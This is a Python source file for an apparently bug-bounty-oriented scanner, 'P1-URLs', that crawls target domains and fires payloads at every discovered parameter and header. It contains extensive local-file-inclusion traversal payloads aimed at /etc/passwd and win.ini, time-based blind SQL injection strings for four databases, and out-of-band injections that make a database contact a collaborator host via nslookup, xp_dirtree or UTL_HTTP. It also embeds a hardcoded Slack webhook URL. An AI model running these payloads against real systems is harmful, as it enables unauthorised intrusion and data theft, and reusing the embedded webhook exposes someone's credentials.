#!/usr/bin/env python3
"""
P1-URLs.py - v2.0.3 (Definitive Production Release)

This is the final, stable version of the P1-URLs scanner. It combines
a high-speed, concurrent workflow with an intelligent "probe-then-attack"
methodology and advanced, evasive vulnerability testing modules. All known bugs
have been corrected.
"""
import subprocess, argparse, os, re, shutil, sys, time, random, string, threading, signal
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from difflib import SequenceMatcher
from datetime import datetime
from rich.console import Console
try:
    from rich.panel import Panel
except ImportError:
    from rich.containers import Panel
from tqdm import tqdm
import requests, json, urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed, CancelledError

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ==============================================================================
# === Config ===
# ==============================================================================
SLACK_WEBHOOK = "https://hooks.slack.com/services/T03JPK11LNM/B0908RQP1GB/hrmkhkKGbO72J0OMa9g4kb0"
KATANA_CONCURRENCY_DEFAULT, CONCURRENCY_DEFAULT = 25, 25; TIME_DELAY, REQUEST_TIMEOUT = 6, 8
MAX_REQUESTS_PER_SECOND = 20
BULK_URLS_OUTPUT, DEDUPED_URLS = "target_bulk_urls.txt", "unique_urls_filtered.txt"
GF_PATTERNS = ["lfi", "sqli", "redirect"]
CLEAN_BASE_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Accept-Language": "en-US,en;q=0.9"}
HEADERS_TO_TEST = ["User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP", "X-Real-IP", "Origin", "CF-Connecting-IP"]
METHODS_TO_TEST = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
LFI_SIMILARITY_THRESHOLD = 0.9 
LFI_CONFIDENCE_STRINGS = {"Linux /etc/passwd": r"root:(x|\*|\$[^:]*):0:0:","Windows boot.ini": r"\[boot loader\]|\[operating systems\]","PHP data:// Wrapper Exec": r"40212b72c3a51610a26e848608871439","Base64 Linux /etc/passwd": r"cm9vdDo="}
DEFAULT_LFI_PAYLOADS = ["../../../../../../../../etc/passwd","/etc/passwd","../../../../../../../../windows/win.ini","/windows/win.ini","c:\\boot.ini","..\\..\\..\\boot.ini","../../../../../../../../etc/passwd%00","../../../../../../../../boot.ini%00","..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","php://filter/convert.base64-encode/resource=/etc/passwd","php://filter/resource=/etc/passwd","php://filter/read=string.rot13/resource=/etc/passwd","data:text/plain;base64,PD9waHAgZWNobyBtZDUoJ3AxbmN1c3RvbScpOyA/Pg==","L2V0Yy9wYXNzd2Q=","//..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/etc/passwd","///////../../../etc/passwd","../../../../../../../../../../../../../etc/passwd","//////////////////../../../../../../../../etc/passwd",".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd","%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd","file:/etc/passwd", "file:///etc/passwd"]
for i in range(2, 20): DEFAULT_LFI_PAYLOADS.extend([('../' * i) + 'etc/passwd', ('../' * i) + 'windows/win.ini', ('%2e%2e/' * i) + 'etc/passwd'])
CANARY_SQLI_PAYLOADS = {"MySQL": ["{val}' AND SLEEP({delay})-- -"],"PostgreSQL": ["';SELECT pg_sleep({delay})--"],"MSSQL": ["';WAITFOR DELAY '0:0:{delay}'--"],"Oracle": ["{val}' AND DBMS_LOCK.SLEEP({delay})-- -"]}
BLIND_SQLI_PAYLOADS = {"MySQL": ["0'XOR(if(now()=sysdate(),sleep({delay}),0))XOR'Z","0'XOR(if(now()=sysdate(),sleep({delay}),0))+XOR'Z","0\"XOR(if(now()=sysdate(),sleep({delay}),0))XOR\"Z","{val}' XOR IF(NOW()=SYSDATE(),SLEEP({delay}),0) XOR 'Z'","X'XOR(if(now()=sysdate(),sleep({delay}),0))XOR'X","\"XOR(if(now()=sysdate(),sleep({delay}),0))XOR\"","{val}' XOR (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -","' OR IF(ASCII(SUBSTR(user(),1,1))=114,SLEEP({delay}),0)--","{val}'+AND+(SELECT+1848+FROM+(SELECT(SLEEP({delay})))OHwd)--+FnqF", "{val}';(SELECT*FROM(SELECT(SLEEP({delay})))a)", "{val}')) or sleep({delay})='", "{val}\");SELECT+SLEEP({delay})#"],"PostgreSQL": ["1' AND (SELECT 1)=(SELECT 1) XOR (SELECT pg_sleep({delay})) IS NULL--","'OR 1=(SELECT CASE WHEN (1=1) THEN PG_SLEEP({delay}) ELSE NULL END)--", "1 AND CAST(pg_sleep({delay}) AS varchar) IS NULL"],"MSSQL": ["1' OR 1=(SELECT 1 WHERE 1=1^0); WAITFOR DELAY '0:0:{delay}'--", "';+IF+(1=1)+WAITFOR+DELAY+'0:0:{delay}'--"],"Oracle": ["orwa'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),{delay})||'", "'; BEGIN DBMS_LOCK.SLEEP({delay}); END;--"]}
OOB_SQLI_PAYLOADS = {"MySQL": ["{val}' AND IF(1=1, (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{oob_id}.p1_mysql.', '{collab_url}','\\\\a.txt'))), 0)-- -"],"PostgreSQL": ["';COPY (SELECT '') FROM PROGRAM 'nslookup {oob_id}.p1_pg.{collab_url}';--"],"MSSQL": ["'; exec master..xp_dirtree '\\\\{oob_id}.p1_mssql.{collab_url}\\a';--"],"Oracle": ["AND (SELECT UTL_HTTP.REQUEST('http://{oob_id}.p1_oracle.{collab_url}') FROM DUAL) IS NOT NULL","AND 1=CASE WHEN (1=1) THEN (SELECT UTL_INADDR.GET_HOST_NAME('127.0.0.1','{oob_id}.p1_oracle_case.{collab_url}') FROM DUAL) ELSE 0 END"]}
console = Console()
skip_current_target, throttler = threading.Event(), None

class Throttler:
    def __init__(self, rate_limit): self.rate_limit, self.tokens, self.last_check, self.lock = rate_limit, rate_limit, time.time(), threading.Lock()
    def wait(self):
        with self.lock:
            now, time_passed = time.time(), time.time() - self.last_check; self.last_check = now
            self.tokens += time_passed * self.rate_limit
            if self.tokens > self.rate_limit: self.tokens = self.rate_limit
            if self.tokens < 1: time.sleep(1 - self.tokens); self.tokens += (1 - self.tokens)
            self.tokens -= 1
def make_throttled_request(method, url, **kwargs):
    if throttler: throttler.wait()
    return requests.request(method, url, **kwargs)
def signal_handler(sig, frame):
    if skip_current_target.is_set(): console.print("\n[bold red][!] Second Ctrl+C detected. Exiting forcefully.[/bold red]"); sys.exit(0)
    console.print("\n[bold yellow][!] Ctrl+C detected. Will skip to next major step after current operation completes.[/bold yellow]"); skip_current_target.set()
def print_banner():
    def typewriter_effect(text, delay=0.01, style=""):
        for char in text: console.print(f"[{style}]{char}[/{style}]", end=""); sys.stdout.flush(); time.sleep(delay)
        print()
    os.system('cls' if os.name == 'nt' else 'clear'); console.print("[bold cyan]Booting P1-URLs Scanner...[/bold cyan]"); time.sleep(0.5)
    for _ in range(5): console.print(f"[bold green]{''.join(random.choice('01 ') for _ in range(os.get_terminal_size().columns))}[/bold green]", overflow="hidden", no_wrap=True); time.sleep(0.02)
    ascii_art_lines = ["██████╗  ██╗    ██████╗ ██████╗ ██╗     ███████╗","██╔══██╗ ██║    ██╔══██╗██╔══██╗██║     ██╔════╝","██████╔╝ ██║    ██║  ██║██████╔╝██║     ███████╗","██╔═══╝  ██║    ██║  ██║██╔══██╗██║     ╚════██║","██║      ███████╗██████╔╝██║  ██║███████╗███████║","╚═╝      ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝"]
    console.print("\n[bold red]Initializing Mainframe...[/bold red]"); final_panel_text = []
    for line in ascii_art_lines: console.print(f"[bold cyan]{line}[/bold cyan]", highlight=False); final_panel_text.append(f"[bold cyan]{line}[/bold cyan]"); time.sleep(0.05)
    subtitle_text = "\n[yellow]v2.0.3 Definitive Production Release[/yellow]\n"; typewriter_effect(subtitle_text, style="yellow"); final_panel_text.append(subtitle_text); time.sleep(0.5)
    final_footer = "[bold green]by bugcrowd.com/realvivek[/]  [dim]|[/]  [bold sky_blue3]x.com/starkcharry[/]"; panel = Panel("\n".join(final_panel_text),title="[bold red]P1 URLs[/]", subtitle=final_footer, subtitle_align="right", border_style="bold blue", padding=(1, 2))
    os.system('cls' if os.name == 'nt' else 'clear'); console.print(panel); time.sleep(1)
def send_status_update(message):
    try: requests.post(SLACK_WEBHOOK, json={"text": message}, timeout=5, verify=False)
    except requests.RequestException: pass
def check_dependencies():
    console.print("[bold yellow][*] Checking for required tools...[/]")
    try: import tqdm
    except ImportError: console.print("[bold red][!] Python module 'tqdm' not found. Please run 'pip3 install --user tqdm'[/bold red]"); exit(1)
    tools = ["katana", "uro", "gf", "nuclei", "gau"]; all_found = all(shutil.which(tool) for tool in tools)
    if not all_found: [console.print(f"[bold red][!] Tool not found in PATH:[/] {tool}") for tool in tools if not shutil.which(tool)]; console.print("[bold red][!] Please install the missing tools.[/]"); exit(1)
    console.print("[bold green][✔] All tools are installed.[/]")
def report_and_log(title, details, log_file, severity="CRITICAL", icon="🚨"):
    console.print(Panel(f"[bold white]{title}[/bold white]\n" + "\n".join(f"[bold cyan]• {k}:[/bold cyan] [white]{v}[/white]" for k, v in details.items()), border_style="bold green", expand=False))
    slack_message = (f"{icon} *{title}*\n" f"• *Severity:* `{severity}`\n") + "".join((f"• *{k}:* ```{v}```\n" if 'Payload' in k or 'Command' in k else f"• *{k}:* `{v}`\n") for k, v in details.items())
    try: requests.post(SLACK_WEBHOOK, json={"text": slack_message}, timeout=10, verify=False)
    except requests.RequestException as e: console.print(f"[red]Slack alert failed: {e}[/red]")
    with open(log_file, "a") as f: f.write(json.dumps({"title": title, "severity": severity, **details}) + "\n")
def log_oob_attempt(oob_id, full_details, log_file):
    console.print(Panel(f"[bold white]Firing OOB SQLi Payload[/bold white]\n" + "\n".join(f"[bold cyan]• {k}:[/bold cyan] [white]{v}[/white]" for k, v in {"OOB ID": oob_id, **full_details}.items()), border_style="yellow", expand=False))
    with open(log_file, "a") as f: f.write(json.dumps({"oob_id": oob_id, **full_details}) + "\n")
def run_command(command, stdin_data=None):
    try: return subprocess.run(command, input=stdin_data, capture_output=True, text=True, check=False).stdout
    except FileNotFoundError: console.print(f"[bold red][!] Command not found: {command[0]}.[/]"); return None
def is_ip_address(hostname):
    if hostname is None: return False
    return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", hostname) is not None
def gather_urls(input_file, output_file, katana_concurrency, use_wayback):
    console.print("[bold cyan]Step 1: Gathering URLs...[/]");
    with open(input_file) as f: targets = [line.strip() for line in f if line.strip()]
    with open(output_file, 'w') as out_file:
        pbar = tqdm(targets, desc="Discovering URLs", unit="target", bar_format="{l_bar}{bar:20}{r_bar}")
        for target in pbar:
            hostname = urlparse(target).netloc
            if not hostname: continue
            pbar.set_description(f"Katana on {hostname[:30]}")
            katana_cmd = ["katana", "-u", target, "-silent", "-nc", "-kf", "-c", str(katana_concurrency)]
            if katana_result := run_command(katana_cmd):
                if katana_result.strip(): out_file.write(katana_result + '\n')
            if use_wayback and not is_ip_address(hostname):
                pbar.set_description(f"GAU on {hostname[:35]}")
                gau_cmd = ["gau", "--subs", hostname]
                if gau_result := run_command(gau_cmd):
                    if gau_result.strip(): out_file.write(gau_result + '\n')
    console.print(f"\n[bold green][✔] URL gathering complete.[/bold green]")
def run_uro(input_file, output_file):
    console.print("\n[bold cyan]Step 2: Deduplicating URLs[/]")
    with open(input_file) as f: raw_urls = f.read()
    if not raw_urls.strip(): console.print("[yellow][-] No URLs to deduplicate.[/yellow]"); Path(output_file).touch(); return 0
    uro_result = run_command(["uro"], stdin_data=raw_urls); count = 0
    if uro_result and uro_result.strip():
        with open(output_file, "w") as out: out.write(uro_result)
        count = len(uro_result.strip().split('\n'))
    console.print(f"[bold green][✔] Deduplication complete. Unique URLs: {count}[/bold green]"); return count
def run_gf(input_file, gf_output_dir, basefile):
    console.print("\n[bold cyan]Step 3: Classifying URLs with GF[/]")
    if not Path(input_file).exists() or Path(input_file).stat().st_size == 0: console.print("[yellow][-] No URLs to classify.[/yellow]"); return
    with open(input_file) as f: urls_to_classify = f.read()
    for pattern in GF_PATTERNS:
        if result := run_command(["gf", pattern], stdin_data=urls_to_classify):
            if result.strip():
                with open(gf_output_dir / f"{basefile}_{pattern}.txt", "w") as out: out.write(result); console.print(f"    [bold green][✔] Found {len(result.strip().split())} potential '{pattern}' URLs.[/bold green]")
    console.print("[bold green][✔] GF classification complete.[/bold green]")
def check_lfi_payload(session, base_content, param, lfi_payload, query_params, parsed_url, proxy_config):
    if skip_current_target.is_set(): return None
    malicious_url = urlunparse(parsed_url._replace(query=urlencode({**query_params, param: lfi_payload}, doseq=True)))
    try:
        attack_resp = make_throttled_request("GET", malicious_url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False, proxies=proxy_config); attack_content = attack_resp.text
        if SequenceMatcher(None, base_content, attack_content).ratio() < LFI_SIMILARITY_THRESHOLD:
            for rule_name, pattern in LFI_CONFIDENCE_STRINGS.items():
                if re.search(pattern, attack_content, re.IGNORECASE): return {"url": malicious_url, "param": param, "rule": rule_name, "payload": lfi_payload}
    except requests.RequestException: pass
    return None
def test_lfi_dynamically(lfi_urls_file, args, lfi_results_file, concurrency):
    console.print(f"\n[bold cyan]Step 4: LFI Testing (High-Throughput)...[/]")
    if not lfi_urls_file.exists() or lfi_urls_file.stat().st_size == 0: return
    lfi_payloads = DEFAULT_LFI_PAYLOADS
    if args.lfi_payloads:
        with open(Path(args.lfi_payloads)) as f: lfi_payloads = [line.strip() for line in f if line.strip()]
    with open(lfi_urls_file) as f: urls_to_test = [line.strip() for line in f if line.strip()]
    lfi_proxy = args.proxy_lfi or args.proxy
    if lfi_proxy: console.print(f"[*] Using proxy for LFI tests: {lfi_proxy}")
    proxy_config = {"http": lfi_proxy, "https": lfi_proxy} if lfi_proxy else None
    console.print(f"[*] Beginning LFI checks on {len(urls_to_test)} URLs (Concurrency: {concurrency})...")
    session = requests.Session()
    for i, url in enumerate(urls_to_test):
        if skip_current_target.is_set(): console.print(f"[bold yellow]Skipping LFI checks for {url}...[/bold yellow]"); skip_current_target.clear(); continue
        console.print(f"\n[bold]Testing URL ({i+1}/{len(urls_to_test)}):[/] [cyan]{url}[/]")
        try: base_resp = make_throttled_request("GET", url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False, proxies=proxy_config); base_content = base_resp.text
        except requests.RequestException as e: console.print(f"  [!] Failed to get baseline for {url}: {e}"); continue
        parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query, keep_blank_values=True)
        for param in query_params:
            if skip_current_target.is_set(): break
            test_cases_for_param = [(session, base_content, param, payload, query_params, parsed_url, proxy_config) for payload in lfi_payloads]
            with ThreadPoolExecutor(max_workers=concurrency) as executor:
                futures = {executor.submit(check_lfi_payload, *case): case for case in test_cases_for_param}
                pbar = tqdm(as_completed(futures), total=len(futures), desc=f"Param: {param[:15]:<15}", unit="req", leave=False, bar_format="{l_bar}{bar:20}{r_bar}")
                found = False
                for future in pbar:
                    try:
                        if skip_current_target.is_set(): future.cancel(); continue
                        if (result := future.result()) and not found:
                            report_and_log("Vivek - LFI Vulnerability Found", {"Vulnerable URL": result['url'], "Parameter": result['param'], "Detection Rule": result['rule'], "Payload Used": result['payload']}, lfi_results_file, severity="HIGH"); found = True
                            pbar.close(); [f.cancel() for f in futures]
                    except CancelledError: pass
    console.print(f"\n[bold green][✔] LFI scan complete.[/bold green]")
def generate_oob_id(size=6, chars=string.ascii_lowercase + string.digits): return ''.join(random.choice(chars) for _ in range(size))
def generate_curl_command(url, method, headers, proxy=None):
    command = f"curl -k -X {method.upper()} '{url}'";
    if proxy: command += f" --proxy {proxy}"
    for key, value in headers.items(): command += f" -H '{key}: {value}'"
    if method.upper() in ["POST", "PUT", "PATCH"]: command += " --data 'p1=p1'"
    return command
def _check_sqli_vulnerability_time(target_url, method, headers, proxy_config):
    try:
        baseline_url = urlparse(target_url)._replace(query="").geturl() if '?' in target_url else target_url
        start_baseline = time.time(); make_throttled_request("GET", baseline_url, headers=CLEAN_BASE_HEADERS, timeout=5, verify=False, proxies=proxy_config); baseline_duration = time.time() - start_baseline
        start_attack = time.time(); make_throttled_request(method.upper(), target_url, headers=headers, data={"p1":"p1"} if method.upper() in ["POST", "PUT", "PATCH"] else None, timeout=(TIME_DELAY + 5), verify=False, proxies=proxy_config); attack_duration = time.time() - start_attack
        if (attack_duration > TIME_DELAY) and (attack_duration - baseline_duration > TIME_DELAY * 0.8): return True, attack_duration
    except requests.exceptions.Timeout: return True, time.time() - (locals().get('start_attack', time.time()))
    except requests.exceptions.RequestException: pass
    return False, 0
def check_sqli_payload(url, method, payload, injection_point_type, injection_point_name, db_name, test_type, oob_id, oob_log_file, proxy):
    if skip_current_target.is_set(): return None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers, malicious_url = CLEAN_BASE_HEADERS.copy(), url
    if injection_point_type == "Parameter": malicious_url = urlunparse(urlparse(url)._replace(query=urlencode({**parse_qs(urlparse(url).query, keep_blank_values=True), injection_point_name: payload}, doseq=True)))
    elif injection_point_type == "Parameter-HPP": malicious_url = urlunparse(urlparse(url)._replace(query=urlencode(list(parse_qs(urlparse(url).query, keep_blank_values=True).items()) + [(injection_point_name, payload)], doseq=True)))
    elif injection_point_type == "Header": headers[injection_point_name] = payload
    if test_type == "Time-Based":
        is_vuln, time_taken = _check_sqli_vulnerability_time(malicious_url, method, headers, proxies)
        if is_vuln: return {"url": url, "db": db_name, "payload": payload, "details": {"Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method, "Type": "Time-Based", "Time Taken": f"{time_taken:.2f}s", "Curl Command": generate_curl_command(malicious_url, method, headers, proxy)}}
    elif test_type == "OOB" and oob_id and oob_log_file: _fire_oob_payload(malicious_url, method, headers, oob_id, oob_log_file, {"URL": url, "Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method, "Payload Used": payload}, proxies)
    return None
def _fire_oob_payload(target_url, method, headers, oob_id, oob_log_file, full_details, proxy_config):
    log_oob_attempt(oob_id, full_details, oob_log_file)
    try: make_throttled_request(method.upper(), target_url, headers=headers, data={"p1":"p1"} if method.upper() in ["POST", "PUT", "PATCH"] else None, timeout=5, verify=False, proxies=proxy_config)
    except requests.RequestException: pass
def test_blind_sqli(sqli_urls_file, blind_sqli_results_file, oob_log_file, args, concurrency):
    console.print(f"\n[bold cyan]Step 5: SQLi Testing (Smart Scan)...[/]")
    if not sqli_urls_file.exists() or sqli_urls_file.stat().st_size == 0: return
    proxy = args.proxy_sqli or args.proxy
    if proxy: console.print(f"[*] Using proxy for SQLi tests: {proxy}")
    with open(sqli_urls_file) as f: urls = [line.strip() for line in f]; random.shuffle(urls)
    probe_test_cases, full_attack_map, collab_host = [], {}, None
    console.print("[*] Preparing fast probes to identify potential SQLi candidates...")
    for url in urls:
        if skip_current_target.is_set(): continue
        for param, values in parse_qs(urlparse(url).query, keep_blank_values=True).items():
            for db, payloads in CANARY_SQLI_PAYLOADS.items(): payload = payloads[0].format(delay=TIME_DELAY, val=(values[0] if values else "")); probe_test_cases.extend([(url,"GET",payload,"Parameter",param,db, "Time-Based", None, None, proxy),(url,"GET",payload,"Parameter-HPP",param,db, "Time-Based", None, None, proxy)])
        for header in HEADERS_TO_TEST:
            for db, payloads in CANARY_SQLI_PAYLOADS.items(): payload = payloads[0].format(delay=TIME_DELAY, val=""); probe_test_cases.append((url,"GET",payload,"Header",header,db, "Time-Based", None, None, proxy))
    if not probe_test_cases: console.print("[yellow][-] No injection points found for SQLi probing.[/yellow]"); return
    console.print(f"[*] Submitting {len(probe_test_cases)} fast probes...")
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = {executor.submit(check_sqli_payload, *case): case for case in probe_test_cases}
        for future in tqdm(as_completed(futures), total=len(futures), desc="SQLi Probes     ", unit="req", bar_format="{l_bar}{bar:20}{r_bar}"):
            try:
                if skip_current_target.is_set(): future.cancel(); continue
                if result := future.result():
                    candidate_key = f"{result['details']['Injection Point']}@{result['url']}"
                    if candidate_key not in full_attack_map: console.print(f"\n[bold yellow][!] Potential Candidate Found:[/] {result['details']['Injection Point']} on {result['url']}"); full_attack_map[candidate_key] = (result['db'], result)
            except CancelledError: pass
    if skip_current_target.is_set(): console.print("[bold yellow]Skipping rest of SQLi probes due to interrupt.[/bold yellow]"); skip_current_target.clear(); return
    if not full_attack_map: console.print("[green][✔] No promising candidates found. SQLi scan complete.[/green]"); return
    console.print(f"\n[bold bright_blue][*] Probe complete. Found {len(full_attack_map)} promising candidates. Launching full exhaustive scan...[/]")
    full_attack_cases = [];
    if args.collab_url: collab_host = urlparse(args.collab_url).netloc or args.collab_url; send_status_update(f"   ...OOB testing active. Monitor `{collab_host}` and `{oob_log_file}`.")
    for key, (db_type, _) in full_attack_map.items():
        point, url = key.split('@'); point_type, point_name = point.split(': ')
        original_value = parse_qs(urlparse(url).query).get(point_name, [""])[0] if "Parameter" in point_type else ""
        if point_type == "Header":
            for method in METHODS_TO_TEST:
                for p_template in BLIND_SQLI_PAYLOADS.get(db_type, []): full_attack_cases.append((url, method, p_template.format(delay=TIME_DELAY, val=original_value), "Header", point_name, db_type, "Time-Based", None, None, proxy))
                if collab_host and db_type in OOB_SQLI_PAYLOADS:
                    for p_template in OOB_SQLI_PAYLOADS[db_type]: oob_id, payload = generate_oob_id(), p_template.format(oob_id=oob_id, collab_url=collab_host, val=""); full_attack_cases.append((url, method, payload, "Header", point_name, db_type, "OOB", oob_id, oob_log_file, proxy))
        else:
            for p_template in BLIND_SQLI_PAYLOADS.get(db_type, []): payload = p_template.format(delay=TIME_DELAY, val=original_value); full_attack_cases.extend([(url, "GET", payload, "Parameter", point_name, db_type, "Time-Based", None, None, proxy), (url, "GET", payload, "Parameter-HPP", point_name, db_type, "Time-Based", None, None, proxy)])
            if collab_host and db_type in OOB_SQLI_PAYLOADS:
                for p_template in OOB_SQLI_PAYLOADS[db_type]: oob_id = generate_oob_id(); payload = p_template.format(oob_id=oob_id, collab_url=collab_host, val=original_value); full_attack_cases.extend([(url,"GET",payload,"Parameter",point_name,db_type,"OOB",oob_id,oob_log_file,proxy),(url,"GET",payload,"Parameter-HPP",point_name,db_type,"OOB",oob_id,oob_log_file,proxy)])
    
    console.print(f"[*] Submitting {len(full_attack_cases)} exhaustive tests on candidates...")
    found_vuln_keys = set()
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = {executor.submit(check_sqli_payload, *case): case for case in full_attack_cases}
        for future in tqdm(as_completed(futures), total=len(full_attack_cases), desc="Exhaustive SQLi", unit="req", bar_format="{l_bar}{bar:20}{r_bar}"):
            try:
                if skip_current_target.is_set(): future.cancel()
                if (result := future.result()) and (vuln_key := f"{result['url']}_{result['details']['Injection Point']}") not in found_vuln_keys:
                    found_vuln_keys.add(vuln_key); report_and_log("Vivek - Blind SQLi Vulnerability Found", {"URL": result['url'],**result['details']}, blind_sqli_results_file)
            except CancelledError: pass
    console.print(f"[bold green][✔] Full SQLi scan on candidates complete.[/bold green]")
def run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_findings_file, proxy):
    console.print(f"\n[bold cyan]Step 5: Nuclei Scanning for Redirects...[/]")
    pattern = "redirect"
    file_path = Path(gf_dir) / f"{basefile}_{pattern}.txt"
    if not file_path.exists() or file_path.stat().st_size == 0:
        console.print(f"[yellow][-] No potential '{pattern}' URLs to test.[/yellow]"); return
    nuclei_cmd = ["nuclei", "-l", str(file_path), "-jsonl", "-rate-limit", "150", "-tags", pattern, "-silent"]
    if proxy: console.print(f"[*] Using proxy for Nuclei tests: {proxy}"); nuclei_cmd.extend(["-p", proxy])
    console.print(f"[*] Scanning for [bold magenta]{pattern}[/]...");
    nuclei_result = run_command(nuclei_cmd)
    if nuclei_result and nuclei_result.strip():
        with open(nuclei_findings_file, 'w') as f: f.write(nuclei_result)
        for line in nuclei_result.strip().split('\n'):
            try:
                result = json.loads(line); info = result.get("info", {})
                report_and_log("Vivek - Nuclei Vulnerability Found", {"Vulnerability": result.get("template-id", "N/A").upper(), "URL": result.get("matched-at", "N/A"), "Template": info.get("name", "N/A")}, nuclei_findings_file, severity=info.get("severity", "N/A").upper())
            except (json.JSONDecodeError, KeyError): continue
    console.print("[bold green][✔] Nuclei scanning complete.[/bold green]")
def main():
    parser = argparse.ArgumentParser(description="P1-URLs Scanner - v2.1.3")
    parser.add_argument("-l", "--list", required=True, help="Path to subdomains or URLs.")
    parser.add_argument("-u", "--use-urls", action="store_true", help="Skip discovery, use file as URLs.")
    parser.add_argument("-p", "--lfi-payloads", help="Optional: Path to custom LFI payloads file.")
    parser.add_argument("-c", "--collab-url", help="Collaborator URL for Out-of-Band (OOB) SQLi checks.")
    parser.add_argument("--concurrency", type=int, default=CONCURRENCY_DEFAULT, help=f"Set concurrency for tests (default: {CONCURRENCY_DEFAULT}).")
    parser.add_argument("--rate-limit", type=int, default=MAX_REQUESTS_PER_SECOND, help=f"Set max requests per second (default: {MAX_REQUESTS_PER_SECOND}).")
    parser.add_argument("--wayback", action="store_true", help="Also use GAU to gather URLs from historical archives (for domains only).")
    parser.add_argument("--proxy", help="Global fallback proxy for all HTTP/S requests.")
    parser.add_argument("--proxy-lfi", help="Dedicated proxy for LFI tests.")
    parser.add_argument("--proxy-sqli", help="Dedicated proxy for custom SQLi tests.")
    parser.add_argument("--proxy-nuclei", help="Dedicated proxy for Nuclei scans.")
    args = parser.parse_args();
    concurrency, katana_concurrency = args.concurrency, args.concurrency
    global throttler; throttler = Throttler(args.rate_limit)
    input_file, basefile = Path(args.list), Path(args.list).stem
    if not input_file.is_file(): console.print(f"[red][!] Input file not found:[/] {input_file}"); return
    
    temp_input_file = Path(f".temp_{basefile}_{datetime.now().strftime('%f')}.txt")
    console.print(f"[*] Pre-processing input file to ensure proper URL format...")
    lines_written = 0
    with open(input_file, 'r') as f_in, open(temp_input_file, 'w') as f_out:
        for line in f_in:
            line = line.strip()
            if line:
                if not line.startswith(('http://', 'https://')): f_out.write(f"https://{line}\n")
                else: f_out.write(f"{line}\n")
                lines_written += 1
    console.print(f"[green][✔][/green] Input processed. Found {lines_written} targets.")

    output_dir = Path(f"scan_results_{basefile}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}"); console.print(f"[bold bright_blue]Creating isolated scan directory: {output_dir}[/]")
    if output_dir.exists(): shutil.rmtree(output_dir)
    gf_dir, nuclei_dir = output_dir/"gf_results", output_dir/"nuclei_results"; os.makedirs(gf_dir); os.makedirs(nuclei_dir)
    lfi_file, sqli_file, nuclei_file, oob_file = output_dir/"lfi_vulnerable.json", output_dir/"blind_sqli_vulnerable.json", output_dir/"nuclei_findings.json", output_dir/"oob_requests.log"
    deduped_urls_path = output_dir / "unique_urls_filtered.txt"
    send_status_update(f"🚀 *Scan Started* on `{basefile}`...")
    lfi_proxy, sqli_proxy, nuclei_proxy = args.proxy_lfi or args.proxy, args.proxy_sqli or args.proxy, args.proxy_nuclei or args.proxy
    
    if args.use_urls:
        workflow = [("Deduplicating URLs...", lambda: run_uro(str(temp_input_file), deduped_urls_path)),
                    ("Classifying URLs...", lambda: run_gf(deduped_urls_path, gf_dir, basefile)),
                    ("LFI Analysis...", lambda: test_lfi_dynamically(gf_dir/f"{basefile}_lfi.txt", args, lfi_file, concurrency)), 
                    ("Blind SQLi Analysis...", lambda: test_blind_sqli(gf_dir/f"{basefile}_sqli.txt", sqli_file, oob_file, args, concurrency)),
                    ("Redirect Scanning...", lambda: run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_file, nuclei_proxy))]
    else:
        workflow = [("Gathering URLs...", lambda: gather_urls(str(temp_input_file), output_dir/BULK_URLS_OUTPUT, katana_concurrency, args.wayback)),
                    ("Deduplicating URLs...", lambda: run_uro(output_dir/BULK_URLS_OUTPUT, deduped_urls_path)),
                    ("Classifying URLs...", lambda: run_gf(deduped_urls_path, gf_dir, basefile)),
                    ("LFI Analysis...", lambda: test_lfi_dynamically(gf_dir/f"{basefile}_lfi.txt", args, lfi_file, concurrency)),
                    ("Blind SQLi Analysis...", lambda: test_blind_sqli(gf_dir/f"{basefile}_sqli.txt", sqli_file, oob_file, args, concurrency)),
                    ("Redirect Scanning...", lambda: run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_file, nuclei_proxy))]

    signal.signal(signal.SIGINT, signal_handler)
    for i, (name, func) in enumerate(workflow, 1):
        if skip_current_target.is_set():
            console.print(f"[bold yellow]Skipping step '{name}' due to user interrupt.[/bold yellow]"); continue
        send_status_update(f"⚙️ `[{i}/{len(workflow)}]` Starting {name}")
        func()
        
    os.remove(temp_input_file)
    console.print(f"\n[bold green][✔] All tasks complete! Results are in: {output_dir}[/bold green]"); send_status_update(f"✅ *Scan Complete* for `{basefile}`.")

if __name__ == "__main__":
    print_banner()
    check_dependencies()
    main()
